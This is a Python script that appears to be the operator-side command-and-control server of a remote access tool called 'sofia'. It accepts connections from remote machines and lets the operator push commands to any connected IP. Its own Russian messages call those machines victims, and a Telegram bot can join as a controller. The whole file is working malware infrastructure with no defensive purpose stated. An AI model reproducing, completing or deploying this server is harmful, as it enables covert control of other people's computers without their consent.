try:
    from config import *
    print("[+] Config.py file loaded successfully")
except ImportError:
    print("[-] Config file not found or not installed")

try:
    import socket
    print("[+] Socket library is installed")
except ImportError:
    print("[-] Socket not installed (this is unusual, it's a built-in library)")

try:
    import sys
    print("[+] Sys library is installed")
except ImportError:
    print("[-] Sys not installed (this is very unusual, it's a core Python library)")

try:
    import os
    print("[+] Os library is installed")
except ImportError:
    print("[-] Os not installed (this is very unusual, it's a core Python library)")

try:
    import telebot
    print("[+] Telebot library is installed")
except ImportError:
    print("[-] Telebot not installed")

try:
    import time
    print("[+] Time library is installed")
except ImportError:
    print("[-] Time not installed")

try:
    import threading
    print("[+] Threading library is installed")
except ImportError:
    print("[-] Threading not installed")

bunner = f'''
⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦
⣿⣿⣿⣿⣿⣿⣿⣿⣯⡉⠙⠻⢿⣿⣿⣿⣿⣿⢿⣦
⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⡆⠀⠀⢻⣿⣿⣿⣿⡆⠈⢳⡄
⣿⣿⣿⣿⣿⠈⢿⣿⣿⣿⣷⠖⠀⠀⣿⣿⣿⣿⣿⣄⠀⣿⡄
⣿⣿⣿⣿⣿⣇⠀⢄⡙⠋⠻⡄⠀⣼⣿⣿⣿⣩⠟⠟⠀⣼⣿⡄
⣿⣿⣿⣿⣿⣿⣷⣦⣭⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣦⣴⣿⣿⣷⠀
⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⢰⣶⣄
⣉⣛⣛⣛⣥⣶⣾⣿⣿⣿⣷⡝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⡇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⠟⠀
⢻⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠈⠁
⠀⠹⣿⣿⡿⠿⠛⣋⣥⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

    version: {version_sofia}
    host: {host}
    port = {port}'''

clients = {}

def handle_client(client_socket, addr):
    #print(f"Подключен: {addr}")
    clients[addr] = client_socket
    while True:
        try:
            message = client_socket.recv(1024).decode('utf-8')
            #print(f"Received from {addr}: {message}")
            if message == "telegram_bot":
                print("[+] Telegram Bot connected")
        except:
            break

    client_socket.close()
    del clients[addr]

def send_message_to_client(target_ip, message):
    for addr, client_socket in clients.items():
        if addr[0] == target_ip:
            try:
                client_socket.send(message.encode('utf-8'))
                return
            except:
                client_socket.close()
                del clients[addr]
                return
    print(f"{target_ip} такой жертвы нету")

def command_listener():
    while True:
        command = input()
        if command.startswith('@'):
            parts = command.split(' ', 1)
            if len(parts) == 2:
                target_ip = parts[0][1:]
                msg = parts[1]
                send_message_to_client(target_ip, msg)
            else:
                print("@[IP] (команда) без квадратных и без скобок")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print("[LOG] Server already.")
    threading.Thread(target=command_listener, daemon=True).start()

    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr)).start()

if __name__ == "__main__":
    start_server()